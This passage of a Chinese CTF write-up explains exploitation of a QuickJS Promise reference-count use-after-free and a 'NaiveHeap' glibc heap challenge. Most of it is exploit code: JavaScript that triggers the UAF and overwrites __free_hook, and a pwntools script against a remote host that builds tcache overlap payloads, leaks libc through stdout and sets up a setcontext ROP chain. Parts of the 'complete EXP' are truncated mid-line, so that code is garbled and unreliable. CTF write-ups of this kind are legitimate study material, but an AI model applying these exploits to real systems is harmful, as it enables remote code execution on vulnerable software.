        p->ref_count--;
        if (p->ref_count == 0 && p->mark == 1) {
            list_del(&p->link);
            list_add_tail(&p->link, &rt->tmp_obj_list);
        }
    }
**2、触发 UAF**
既然知道了漏洞，那么现在我们就需要想办法触发这个漏洞，并进行稳定利用。我们知道，漏洞的起因是由于 Promise 传参的时候没有更新
ref_count，导致 Promise 退出的时候多清理了一次 ref_count，从而产生 UAF 漏洞。 那么，我们可以这么做：创建两个全局变量
arr、arr2，利用 arr 创建一个 ArrayBuffer，并传参到一个 Promise 当中；然后在这个 Promise 当中，我们先将 arr
赋值到 arr2，再开启一个 Promise，不过这次我们不进行传参，而是直接引用全局变量。这样，我们在第二个 Promise 中将 arr
改为其他值，由于第一个 Promise 结束，便会使得 arr 原本指向的 Object 的 ref_count 变为 0，从而产生 UAF 漏洞。
    const hex = (x) => {return ("0x" + x.toString(16))};
    let a0, a1;
    ​
    function f2() {
        console.log('Resolve Two');
        Math.min(a1);
        a0 = 1;
        Math.min(a1)//crash!!!
    }
    ​
    function f1(a) {
        arr = 1; 
        a0 = new Uint32Array(a);
        a1 = a0; 
    ​
        let p = new Promise((resolve, reject) => {
            resolve(0);
        });
        p.then(f2);
    }
    ​
    let arr = new ArrayBuffer(0xa00);
    function main() {
        let p = new Promise((resolve, reject) => {
            resolve(arr);
        });
        p.then(f1);
    }
    ​
    main();
**3、getshell**
虽然我们得到了 UAF 漏洞，但是并不意味着我们可以很轻易地 getshell，这里我也是调了一天，期间遇到了很多有趣的问题，这里一一分享。
首先，QuickJS 会检测已经释放的 ArrayBuffer 是否已经 detached，这时如果我们利用 TypedArray 去获取
ArrayBuffer 就会触发 crash，因为 ArrayBuffer 所属 JSObject 已经被释放，ref_count > 0
的检查无法绕过。这里，利用 2019 师傅的思路：申请一些小的 ArrayBuffer 去填满已经释放的 Object 以绕过检查。
        const abs = [];
        a0 = 1;
        for (let i = 0; i fd=&__free_hook，以期待能够在接下来的操作中，分配到
__free_hook。但是，由于 QuickJS 的堆风水实在太难操作，搞了一晚上也无果，最后放弃了。
后面灵光一闪（其实是没好好看玖爷的 WP），有没有可能我们前面申请的 tas 的 Unit32Array 指向的内存块，就在我们的 ArrayBuffer
上呢？于是，顺着这个思路，我就开始找了，做法如下：
        a1[0x100/4] = 0xdeadbeef
        a1[0x100/4+1] = 0xffff  
        tas[1][0] = 0xdeadbeef
        tas[1][1] = 0xdddd
利用 gdb 的 search 功能，我们看一看：
可以看到，tas[1] 指向的 Buffer 位于 &ArrayBuffer+0x208，正好就在我们的操控范围内。同理，我们也可以找其他的
tas[]，只要它的 Buffer 仍在我们的掌控范围内即可。
        a1[0x578/4] = (libc_addr + 0x3ed8e8) & 0xffffffff;
        a1[0x578/4+1] = ((libc_addr + 0x3ed8e8) - a1[0x578/4]) / 0x100000000;
        tas[3][0] = (libc_addr + 0x4f550) & 0xffffffff;
        tas[3][1] = ((libc_addr + 0x4f550) - tas[3][0]) / 0x100000000;
另外，这里要注意一下：在 gdb 中，libc 的高 4 位默认是 0x7fff，但实际上我们运行的时候，并不是 0x7fff。我开始以为一定是
0x7fff，所以默认就：
        a1[0x578/4] = (libc_addr + 0x3ed8e8) & 0xffffffff
        a1[0x578/4+1] = 0x7fff  
        tas[3][0] = (libc_addr + 0x4f550) & 0xffffffff
        tas[3][1] = 0x7fff
最后卡了好久，才发现问题的所在 :(。 另外，还要注意：QuickJS
中，即便是处理注释、换行符也会使用到堆内存，导致堆分布发生变化。所以，即便是注释也要小心使用。此外，还有一些计算方法，不同的表达式也会产生影响。
**4、完整 EXP**
    const hex = (x) => {return ("0x" + x.toString(16))};
    let a0, a1;
    ​
    function f2() {
    const abs = [];
    a0 = 1;
    for (let i = 0; i  {
    resolve(0);
    });
    p.then(f2);
    }
    ​
    let arr = new ArrayBuffer(0xa00);
    function main() {
    let p = new Promise((resolve, reject) => {
    resolve(arr);
    });
    p.then(f1);
    }
    ​
    main();
###  NaiveHeap
  1. 漏洞点是任意地址内存中指针的一次free，可以free tache的结构体，之后就可以重复利用。
  2. 重复利用tache结构体构造overlap。
  3. 修改size获得unsorted bin，partial write unsorted bin的fd把main_arena的bitsmap当作head。
  4. 一路往下写写到stdout，泄露libc，之后free_hook进行rop。
  5. 上一部分往下覆盖路过一个指针，如果指针指向内容不能读就会segfault，可以通过写另一个 fake size，然后利用free往上面打一个tcache的结构体地址，这样保证了那个地址可读
    from pwn import *
    context.log_level = 'debug'
    context.arch = 'amd64'
    # io = process('./chall', aslr=False)
    # io = process('./pwn', aslr=False)
    # io = remote('127.0.0.1', 4455)
    io = remote('1.117.189.158', 60001)
    # elf = ELF('./chall')
    # libc = elf.libc
    rl = lambda	a=False		: io.recvline(a)
    ru = lambda a,b=True	: io.recvuntil(a,b)
    rn = lambda x			: io.recvn(x)
    sn = lambda x			: io.send(x)
    sl = lambda x			: io.sendline(x)
    sa = lambda a,b			: io.sendafter(a,b)
    sla = lambda a,b		: io.sendlineafter(a,b)
    irt = lambda			: io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s,addr		: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
    lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data		: u32(data.ljust(4, '\x00'))
    uu64 = lambda data		: u64(data.ljust(8, '\x00'))
    text ='''heapinfo
    '''
    def Gift(offset):
    	sl(str(0))
    	sl(offset)
    def Add_Del(size, content):
    	sl(str(1))
    	sl(str(size))
    	sl(content)
    Gift('-'+str(0xa0160/8))
    Gift(str(0))
    Add_Del(0x100, '')
    Add_Del(0x200, '')
    Add_Del(0x400, '')
    paylaod = '\x00'*0x18
    paylaod += p64(0x0001000000000000)
    paylaod += '\x00'*0x18
    paylaod += p64(0x0001000000000000)
    paylaod += '\x00'*0xb8
    paylaod += p16(0x72a0)
    Add_Del(0x280, paylaod)
    Add_Del(0x100, '\x00'*0xf0+p64(0)+p32(0x681))
    paylaod = '\x00'*0x18
    paylaod += p64(0x0000000100000000)
    paylaod += '\x00'*0x18
    paylaod += p64(0x0001000000000000)
    paylaod += '\x00'*0xb0
    paylaod += p16(0x73a0)
    Add_Del(0x280, paylaod)
    Add_Del(0xf0, '')
    Add_Del(0x1000, '')
    paylaod = '\x00'*0x18
    paylaod += p64(0)
    paylaod += '\x00'*0x18
    paylaod += p64(0x0001000000000000)
    paylaod += '\x00'*0x138
    paylaod += p16(0x72a0)
    Add_Del(0x280, paylaod)
    Add_Del(0x200, '\x00'*0xf0+p64(0)+p32(0x101))
    paylaod = '\x00'*0x78
    paylaod += p64(0x0001000000000000)
    paylaod += '\x00'*0x1f8
    paylaod += p16(0x73a0)
    Add_Del(0x280, paylaod)
    Add_Del(0x400, '')
    #
    paylaod = '\x00'*0x78
    paylaod += p64(0x0001000000000000)
    paylaod += '\x00'*0x1f8
    paylaod += p16(0x33f0)
    Add_Del(0x280, paylaod)
    paylaod = '\x00'*0x100
    paylaod += p64(0) + p64(0x300)
    Add_Del(0x400, paylaod)
    paylaod = '\x00'*0x78
    paylaod += p64(0x0000000100000000)
    paylaod += '\x00'*0x1f0
    paylaod += p16(0x3500)
    Add_Del(0x280, paylaod)
    paylaod = '\x00'*0x1a0
    paylaod += p64(0xfbad1800)
    paylaod += p64(0)*3
    paylaod += p16(0x3300)
    Add_Del(0x3f0, paylaod)
    paylaod = '\x00'*0x58
    paylaod += p64(0x0000000100000000)
    paylaod += '\x00'*0x190
    paylaod += p16(0x5b28)
    Add_Del(0x280, paylaod)
    sl('0'*0x1000)
    base = uu64(rn(8)) - 0x212ca0
    lg('base')
    pause()
    ###############
    # dbg()
    # pause()
    setcontext=0x7ffff7dc60dd-0x7ffff7d6e000+base
    rdx2rdi=0x7ffff7ec2930-0x7ffff7d6e000+base
    address=0x7ffff7f5cb30-0x7ffff7d6e000+base
    rdi=0
    rsi=address+0xc0
    rdx=0x100
    read=0x7ffff7e7f130-0x7ffff7d6e000+base
    rsp=rsi
    rbp = 153280+base
    leave=371272+base